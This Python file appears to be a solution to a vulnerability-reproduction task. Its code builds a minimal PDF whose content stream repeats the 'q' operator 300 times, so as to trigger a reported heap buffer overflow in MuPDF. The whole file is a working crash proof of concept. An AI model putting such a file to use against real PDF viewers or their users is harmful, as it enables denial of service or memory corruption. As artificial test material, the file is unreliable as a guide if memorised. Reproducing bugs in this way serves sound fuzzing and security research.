import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability oss-fuzz:42537168 in MuPDF.

        The vulnerability is a heap buffer overflow due to an unbounded number of
        graphics state pushes (PDF 'q' operator) without checking the stack depth.
        The internal limit FZ_MAX_GSTATE_STACK in MuPDF is 256. This PoC creates a
        minimal PDF with a content stream that contains more than 256 'q' operators,
        causing a stack overflow. A value of 300 is chosen to be safely above the
        limit.
        """
        
        # Number of 'q' operators to push onto the graphics state stack.
        # This must be greater than FZ_MAX_GSTATE_STACK (256).
        num_q = 300
        stream_content = b'q ' * num_q
        stream_len = len(stream_content)

        # A list to hold the parts of the PDF file.
        pdf_parts = []
        # A dictionary to store the byte offsets of each PDF object.
        offsets = {}
        current_offset = 0

        # PDF Header
        header = b'%PDF-1.7\n%\xde\xad\xbe\xef\n'
        pdf_parts.append(header)
        current_offset += len(header)

        # Object 1: Document Catalog
        offsets[1] = current_offset
        obj1 = b'1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n'
        pdf_parts.append(obj1)
        current_offset += len(obj1)

        # Object 2: Page Tree
        offsets[2] = current_offset
        obj2 = b'2 0 obj\n<< /Type /Pages /Count 1 /Kids [3 0 R] >>\nendobj\n'
        pdf_parts.append(obj2)
        current_offset += len(obj2)

        # Object 3: Page Object
        offsets[3] = current_offset
        obj3 = b'3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R >>\nendobj\n'
        pdf_parts.append(obj3)
        current_offset += len(obj3)

        # Object 4: Content Stream with the malicious payload
        offsets[4] = current_offset
        obj4_header = f'4 0 obj\n<< /Length {stream_len} >>\nstream\n'.encode('ascii')
        obj4_footer = b'\nendstream\nendobj\n'
        obj4 = obj4_header + stream_content + obj4_footer
        pdf_parts.append(obj4)
        current_offset += len(obj4)

        # Cross-reference (xref) table
        xref_offset = current_offset
        xref_body = b'xref\n0 5\n'
        xref_body += b'0000000000 65535 f \n'
        xref_body += f'{offsets[1]:010d} 00000 n \n'.encode('ascii')
        xref_body += f'{offsets[2]:010d} 00000 n \n'.encode('ascii')
        xref_body += f'{offsets[3]:010d} 00000 n \n'.encode('ascii')
        xref_body += f'{offsets[4]:010d} 00000 n \n'.encode('ascii')
        pdf_parts.append(xref_body)
        
        # PDF Trailer
        trailer = b'trailer\n'
        trailer += b'<< /Size 5 /Root 1 0 R >>\n'
        trailer += b'startxref\n'
        trailer += f'{xref_offset}\n'.encode('ascii')
        trailer += b'%%EOF\n'
        pdf_parts.append(trailer)

        # Join all parts to form the final PoC file
        return b''.join(pdf_parts)